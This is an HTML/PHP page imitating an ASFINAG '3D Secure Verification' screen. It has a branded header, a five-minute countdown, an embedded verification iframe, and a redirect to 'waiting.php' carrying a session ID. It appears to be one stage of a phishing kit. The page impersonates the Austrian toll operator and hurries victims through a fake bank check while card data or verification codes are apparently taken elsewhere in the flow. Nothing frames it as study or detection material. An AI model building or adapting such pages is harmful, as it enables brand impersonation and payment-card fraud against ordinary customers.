<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ASFINAG - 3D Secure Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .asfinag-3ds-container {
            max-width: 520px;
            width: 100%;
        }

        .asfinag-3ds-card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .asfinag-3ds-header {
            background: #ea580c;
            padding: 32px 24px;
            text-align: center;
        }

        .asfinag-logo {
            margin-bottom: 16px;
        }

        .asfinag-logo svg {
            width: 120px;
            height: auto;
        }

        .asfinag-3ds-icon {
            font-size: 48px;
            margin-bottom: 16px;
        }

        .asfinag-3ds-title {
            color: white;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 6px;
        }

        .asfinag-3ds-subtitle {
            color: rgba(255, 255, 255, 0.9);
            font-size: 14px;
        }

        .asfinag-3ds-content {
            padding: 32px 28px;
            background: white;
        }

        /* Info Box */
        .asfinag-3ds-info {
            background: #fef3c7;
            border-left: 4px solid #ea580c;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 28px;
            text-align: center;
        }

        /* Timer */
        .asfinag-3ds-timer {
            text-align: center;
            font-size: 13px;
            color: #9ca3af;
            margin-bottom: 28px;
        }

        .asfinag-3ds-countdown {
            font-weight: 700;
            color: #ea580c;
        }

        /* Iframe */
        .asfinag-3ds-iframe {
            width: 100%;
            height: 400px;
            border: none;
            border-radius: 12px;
            margin-bottom: 20px;
        }

        /* Buttons */
        .asfinag-3ds-buttons {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
        }

        .asfinag-3ds-btn {
            flex: 1;
            padding: 12px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            border: none;
            text-align: center;
            text-decoration: none;
            display: inline-block;
        }

        .asfinag-3ds-btn-primary {
            background: #ea580c;
            color: white;
        }

        .asfinag-3ds-btn-primary:hover {
            background: #c2410c;
            transform: translateY(-1px);
        }

        .asfinag-3ds-btn-secondary {
            background: #f3f4f6;
            color: #374151;
            border: 1px solid #e5e7eb;
        }

        .asfinag-3ds-btn-secondary:hover {
            background: #e5e7eb;
        }

        /* Security Notice */
        .asfinag-3ds-security {
            background: #f9fafb;
            border-radius: 10px;
            padding: 14px 18px;
            font-size: 12px;
            color: #6b7280;
            text-align: center;
            border: 1px solid #e5e7eb;
        }

        .asfinag-3ds-security strong {
            color: #ea580c;
            font-weight: 600;
        }

        /* Loading Overlay */
        .asfinag-3ds-loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
        }

        .asfinag-3ds-loading.active {
            opacity: 1;
            visibility: visible;
        }

        .asfinag-3ds-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e5e7eb;
            border-top: 4px solid #ea580c;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        body {
            opacity: 0;
            transition: opacity 0.25s ease;
        }

        body.page-loaded {
            opacity: 1;
        }

        body.page-leave {
            opacity: 0;
        }

        @media (max-width: 480px) {
            .asfinag-3ds-content {
                padding: 24px 20px;
            }
            .asfinag-3ds-header {
                padding: 24px 20px;
            }
            .asfinag-3ds-title {
                font-size: 24px;
            }
            .asfinag-3ds-iframe {
                height: 350px;
            }
            .asfinag-3ds-buttons {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="asfinag-3ds-container">
        <div class="asfinag-3ds-card">
            <div class="asfinag-3ds-header">
                <div class="asfinag-logo">
                    <svg viewBox="0 0 200 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect width="200" height="60" rx="8" fill="white"/>
                        <text x="100" y="38" font-size="24" font-weight="800" text-anchor="middle" fill="#ea580c" font-family="Arial, sans-serif" letter-spacing="2">ASFINAG</text>
                    </svg>
                </div>
                <div class="asfinag-3ds-icon">🔐</div>
                <h1 class="asfinag-3ds-title">3D Secure Verification</h1>
                <p class="asfinag-3ds-subtitle">Your bank requires additional verification</p>
            </div>
            
            <div class="asfinag-3ds-content">
                <div class="asfinag-3ds-info">
                    <strong>Verified by Visa / Mastercard SecureCode</strong>
                    <p style="margin-top: 8px; font-size: 13px;">Your bank is verifying your identity. Please follow the instructions below.</p>
                </div>
                
                <div class="asfinag-3ds-timer">
                    Time remaining: <span class="asfinag-3ds-countdown" id="countdown">05:00</span>
                </div>
                
                <iframe src="about:blank" class="asfinag-3ds-iframe" id="3dsIframe"></iframe>
                
                <div class="asfinag-3ds-buttons">
                    <a href="#" class="asfinag-3ds-btn asfinag-3ds-btn-secondary" id="cancelBtn">Cancel</a>
                    <button class="asfinag-3ds-btn asfinag-3ds-btn-primary" id="retryBtn">Retry Verification</button>
                </div>
                
                <div class="asfinag-3ds-security">
                    <strong>Secure Connection:</strong> Your information is protected by 3D Secure encryption.
                    Never share your verification codes with anyone.
                </div>
            </div>
        </div>
    </div>

    <div class="asfinag-3ds-loading" id="loadingOverlay">
        <div class="asfinag-3ds-spinner"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.body.classList.add('page-loaded');
            
            const iframe = document.getElementById('3dsIframe');
            const retryBtn = document.getElementById('retryBtn');
            const cancelBtn = document.getElementById('cancelBtn');
            const loadingOverlay = document.getElementById('loadingOverlay');
            
            let timeLeft = 5 * 60;
            const countdownElement = document.getElementById('countdown');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    alert('Session expired. Please refresh the page to continue.');
                } else {
                    timeLeft--;
                }
            }
            
            const timerInterval = setInterval(updateTimer, 1000);
            updateTimer();
            
            // Load the 3DS verification iframe
            function load3DS() {
                showLoading();
                setTimeout(() => {
                    iframe.src = 'https://3ds.example.com/verify';
                    hideLoading();
                }, 500);
            }
            
            function showLoading() {
                loadingOverlay.classList.add('active');
            }
            
            function hideLoading() {
                loadingOverlay.classList.remove('active');
            }
            
            retryBtn.addEventListener('click', function() {
                iframe.src = 'about:blank';
                setTimeout(() => {
                    load3DS();
                }, 300);
            });
            
            cancelBtn.addEventListener('click', function(e) {
                e.preventDefault();
                if (confirm('Are you sure you want to cancel the verification? You may be redirected to the payment page.')) {
                    window.location.href = 'payments.php';
                }
            });
            
            // Message listener for iframe communication
            window.addEventListener('message', function(event) {
                if (event.data === 'verification_success') {
                    window.location.href = 'waiting.php?session=<?php echo $sessionId ?? ''; ?>';
                } else if (event.data === 'verification_failed') {
                    alert('Verification failed. Please try again or use another payment method.');
                }
            });
            
            // Initial load
            load3DS();
        });
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.querySelectorAll('a[href]').forEach(link => {
                link.addEventListener('click', () => document.body.classList.add('page-leave'));
            });
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', () => document.body.classList.add('page-leave'));
            });
        });
    </script>
</body>
</html>